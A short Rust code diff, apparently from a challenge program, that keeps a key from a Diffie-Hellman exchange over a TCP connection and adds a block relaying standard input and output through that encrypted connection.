@@ -86,7 +86,7 @@ pub fn main(argc: i32, argv: *const *const u8, envp: *const *const u8) -> i8 {
     let mut remote = TcpStream::connect(format!("{}:2000", ipaddr_l)).expect("Unable to connect.");
 
     // Get the shared AES key
-    let _key = play_dh_kex_remote(&mut remote, &pub_l, seed1).expect("Failed KEX");
+    let key = play_dh_kex_remote(&mut remote, &pub_l, seed1).expect("Failed KEX");
 
     // Create a new rng for the challenge and nonce values
     let mut rng = if let Some(seed2) = get_rand_seed(unsafe { rand_ptr.add(1) }) {
@@ -100,5 +100,16 @@ pub fn main(argc: i32, argv: *const *const u8, envp: *const *const u8) -> i8 {
 
     // TODO: unregister SIGALRM
 
+    // TODO: mkfifo's
+    {
+        let r = STDIN.lock().unwrap();
+        let w = STDOUT.lock().unwrap();
+        let mut node1 = RelayNode {
+            readable: std::io::stdin(),
+            writeable: std::io::stdout(),
+        };
+        // Start up the relay
+        relay(&mut node1, &mut remote, &key, &mut rng);
+    }
     return 0;
 }
